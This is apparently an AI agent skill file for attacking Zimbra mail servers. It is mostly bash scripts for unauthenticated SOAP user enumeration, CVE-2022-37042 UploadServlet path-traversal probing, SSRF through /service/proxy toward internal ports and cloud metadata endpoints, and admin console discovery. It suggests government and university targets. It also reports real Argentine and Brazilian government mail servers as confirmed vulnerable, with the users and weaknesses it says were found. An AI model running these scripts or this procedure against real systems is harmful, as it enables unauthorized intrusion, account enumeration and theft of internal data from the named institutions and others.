---
name: zimbra-attack
description: Zimbra SOAP user enum, CVE-2022-37042, SSRF when webmail.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  hermes:
    tags: [recon, zimbra, SOAP, user-enum, CVE, email]
    category: recon
    related_skills:
      - exchange-owa-attack
      - port-service-discovery
      - subdomain-enumeration
---

# Zimbra Attack Skill

Zimbra Collaboration Suite attack surface — SOAP API user enumeration without authentication, version fingerprinting, UploadServlet path traversal (CVE-2022-37042), `/service/proxy` internal SSRF, and Admin console access. Confirmed on IGN Argentina (Zimbra 8.8.11, admin user confirmed, UploadServlet active), CGE-RJ (Zimbra webmail, SOAP auth functional), and ITERJ (Zimbra webmail active).

## When to Use

- Target has `webmail.`, `mail.`, or `zimbra.` subdomains.
- Redirect to `/zimbra/` path on mail server.
- Server header or page title contains "Zimbra".
- After `subdomain-enumeration` discovers webmail hosts.
- Government, university, or enterprise targets (Zimbra is common in these sectors).

## Prerequisites

- `terminal` tool with curl, python3.
- Target Zimbra URL (typically `https://webmail.target.com`).
- For CVE exploitation: knowledge of target Zimbra version.

## How to Run

```bash
# Quick Zimbra detection
curl -skI "https://TARGET/" | grep -iE "zimbra|zmail"

# SOAP user enumeration
curl -sk -X POST "https://TARGET/service/soap/" \
  -H "Content-Type: application/xml" \
  -d '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><context xmlns="urn:zimbra"/></soap:Header><soap:Body><AuthRequest xmlns="urn:zimbraAccount"><account by="name">admin@TARGET</account><password>test</password></AuthRequest></soap:Body></soap:Envelope>'
```

## Quick Reference

| Endpoint | What It Reveals | Risk |
|----------|----------------|------|
| `/service/soap/` | SOAP API — user enum, auth testing | High |
| `/service/soap/AuthRequest` | Differentiates valid user vs bad password | High |
| `/zimbraAdmin/` | Admin console (if exposed) | Critical |
| `/service/upload?fmt=ext` | UploadServlet (CVE-2022-37042) | Critical |
| `/service/proxy?target=` | Internal SSRF | Critical |
| `/service/extension/` | Extension listing | Medium |
| `/zimbra/downloads/index.html` | Version disclosure | Medium |
| `/zimbra/skins/_base/logos/LoginBanner.png` | Zimbra branding confirmation | Info |

## Procedure

### Phase 1 — Detection & Version Fingerprinting

```bash
TARGET="$1"
OUTDIR="/root/output/zimbra"
mkdir -p "$OUTDIR"

echo "[*] Zimbra detection on $TARGET"

# Check for Zimbra redirect/headers
INITIAL=$(curl -skI --max-time 10 "https://$TARGET/" 2>/dev/null)
if echo "$INITIAL" | grep -qi "zimbra\|zmail"; then
  echo "[+] Zimbra confirmed in headers"
fi

# Check page title
TITLE=$(curl -sk --max-time 10 "https://$TARGET/" 2>/dev/null | grep -oP '<title>\K[^<]+')
if echo "$TITLE" | grep -qi "zimbra"; then
  echo "[+] Zimbra confirmed — Title: $TITLE"
fi

# Version from download page
VER=$(curl -sk --max-time 10 "https://$TARGET/zimbra/downloads/index.html" 2>/dev/null | grep -oP 'Zimbra[^<]+' | head -1)
if [[ -n "$VER" ]]; then
  echo "[+] Version: $VER"
fi

# Version from SOAP response
SOAP_RESP=$(curl -sk -X POST --max-time 10 "https://$TARGET/service/soap/" \
  -H "Content-Type: application/xml" \
  -d '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><context xmlns="urn:zimbra"/></soap:Header><soap:Body><GetVersionInfoRequest xmlns="urn:zimbraAdmin"/></soap:Body></soap:Envelope>' 2>/dev/null)
ZIMBRA_VER=$(echo "$SOAP_RESP" | grep -oP '<VersionString>\K[^<]+')
ZIMBRA_RELEASE=$(echo "$SOAP_RESP" | grep -oP '<ReleaseString>\K[^<]+')
if [[ -n "$ZIMBRA_VER" ]]; then
  echo "[+] Zimbra version from SOAP: $ZIMBRA_VER ($ZIMBRA_RELEASE)"
fi
```

### Phase 2 — SOAP User Enumeration

```bash
TARGET="$1"

echo "[*] SOAP user enumeration on $TARGET"

# Test users
USERS=("admin" "administrator" "spam" "ham" "virus" "galsync" "wiki"
       "user" "webmaster" "info" "contato" "suporte" "test")

for user in "${USERS[@]}"; do
  # AuthRequest with wrong password — differentiates valid vs invalid user
  RESP=$(curl -sk -X POST --max-time 5 "https://$TARGET/service/soap/" \
    -H "Content-Type: application/xml" \
    -d "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Header><context xmlns=\"urn:zimbra\"/></soap:Header><soap:Body><AuthRequest xmlns=\"urn:zimbraAccount\"><account by=\"name\">$user@$TARGET_DOMAIN</account><password>wrongpass</password></AuthRequest></soap:Body></soap:Envelope>" 2>/dev/null)

  if echo "$RESP" | grep -q "authentication failed"; then
    echo "  [VALID] $user — user EXISTS (wrong password)"
  elif echo "$RESP" | grep -q "no such account"; then
    echo "  [INVALID] $user — does not exist"
  elif echo "$RESP" | grep -q "<authToken>"; then
    echo "  [CRITICAL] $user — DEFAULT CREDENTIALS!"
  fi
done
```

### Phase 3 — CVE-2022-37042 UploadServlet Path Traversal

```bash
TARGET="$1"

echo "[*] CVE-2022-37042 check (UploadServlet path traversal)"

# This CVE allows unauthenticated file write via path traversal in UploadServlet
# Affects: Zimbra < 9.0.0 P27, < 8.8.15 P34

UPLOAD_RESP=$(curl -sk -X POST --max-time 10 "https://$TARGET/service/upload?fmt=extended" \
  -H "Content-Type: application/octet-stream" \
  -d "test" 2>/dev/null)

if echo "$UPLOAD_RESP" | grep -qi "upload\|success\|clientToken"; then
  echo "  [+] UploadServlet ACTIVE — CVE-2022-37042 potentially exploitable"
  echo "  Response: $(echo "$UPLOAD_RESP" | head -1)"

  # Test path traversal (doesn't write — just tests if the endpoint processes it)
  TRAVERSAL_RESP=$(curl -sk -X POST --max-time 10 "https://$TARGET/service/upload?fmt=extended&lbfums=" \
    -H "Content-Type: application/octet-stream" \
    -d "../../../../../../opt/zimbra/jetty/webapps/zimbra/public/test.jsp" 2>/dev/null)
  if echo "$TRAVERSAL_RESP" | grep -qi "success"; then
    echo "  [CRITICAL] Path traversal appears functional"
  fi
else
  echo "  [-] UploadServlet not accessible (patched or blocked)"
fi
```

### Phase 4 — Internal SSRF via /service/proxy

```bash
TARGET="$1"

echo "[*] Internal SSRF via /service/proxy"

# Zimbra proxy endpoint allows internal HTTP requests
# Requires LOW-privilege auth, but worth probing unauthenticated

PROXY_TARGETS=(
  "http://localhost:8080/"
  "http://127.0.0.1:7071/"       # Zimbra Admin port
  "http://127.0.0.1:22/"
  "http://169.254.169.254/latest/meta-data/"  # AWS IMDS
  "http://metadata.google.internal/"
)

for pt in "${PROXY_TARGETS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
    "https://$TARGET/service/proxy?target=${pt}" 2>/dev/null)
  if [[ "$code" == "200" || "$code" == "500" ]]; then
    echo "  [SSRF] $pt → HTTP $code (internal service may be reachable)"
  fi
done
```

### Phase 5 — Zimbra Admin Console

```bash
TARGET="$1"

echo "[*] Zimbra Admin console check"

ADMIN_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "https://$TARGET/zimbraAdmin/" 2>/dev/null)

if [[ "$ADMIN_CODE" == "200" ]]; then
  echo "  [+] Zimbra Admin console EXPOSED"
elif [[ "$ADMIN_CODE" == "302" ]]; then
  LOCATION=$(curl -skI --max-time 5 "https://$TARGET/zimbraAdmin/" 2>/dev/null | grep -i "location:" | sed 's/.*: //')
  echo "  [REDIR] Admin console redirects to: $LOCATION"
else
  echo "  [-] Admin console: HTTP $ADMIN_CODE"
fi

# Check port 7071 (Zimbra Admin port, sometimes exposed without reverse proxy)
ADMIN_PORT=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET:7071/zimbraAdmin/" 2>/dev/null)
[[ "$ADMIN_PORT" == "200" ]] && echo "  [CRITICAL] Admin console on port 7071 EXPOSED"
```

## Real Production Results

### IGN Argentina (ign.gob.ar)
- Zimbra 8.8.11_GA_3787 (March 2019 — 7 years old, EOL)
- User `admin` confirmed via SOAP AuthRequest
- UploadServlet active — CVE-2022-37042 path traversal possible
- Admin console at `/zimbraAdmin/` returns HTTP 500 (partial exposure)
- SOAP endpoints: `/service/soap/` and `/service/soap/LoginRequest` active

### CGE-RJ (cge.webmail.rj.gov.br)
- Zimbra webmail — SOAP auth functional
- Combined with WordPress CORS + XML-RPC on same domain

### Zimbra CVE Matrix by Version

| Version | CVE | Impact |
|---------|-----|--------|
| < 8.8.15 P34 | CVE-2022-37042 | Auth bypass via UploadServlet path traversal (RCE) |
| < 9.0.0 P27 | CVE-2022-37042 | Auth bypass via UploadServlet path traversal (RCE) |
| < 8.8.15 P41 | CVE-2023-37580 | Reflected XSS in /public/login.jsp |
| < 8.8.15 P33 | CVE-2022-27925 | Admin console RCE via mboximport (authenticated) |
| 8.8.15 | CVE-2022-30333 | Arbitrary file write via Amavis (RCE) |

## Pitfalls

- **SOAP user enumeration is noisy.** Each request generates a login failure in Zimbra audit logs.
- **UploadServlet may be blocked at nginx.** If Zimbra is behind a reverse proxy, path traversal may be blocked even if the servlet is active.
- **Proxy SSRF requires authentication in newer versions.** Pre-8.8.15 it was accessible without auth.
- **Zimbra Admin on 7071 is internal by default.** Only exposed if misconfigured or port-forwarded.

## Verification

- SOAP AuthRequest MUST differentiate between "authentication failed" (valid user) and "no such account" (invalid user).
- Zimbra version MUST be confirmed from at least 2 sources (SOAP GetVersionInfo, download page, or banner).
- UploadServlet response MUST confirm the endpoint processes uploads.
- All findings must be documented with exact curl commands and responses.
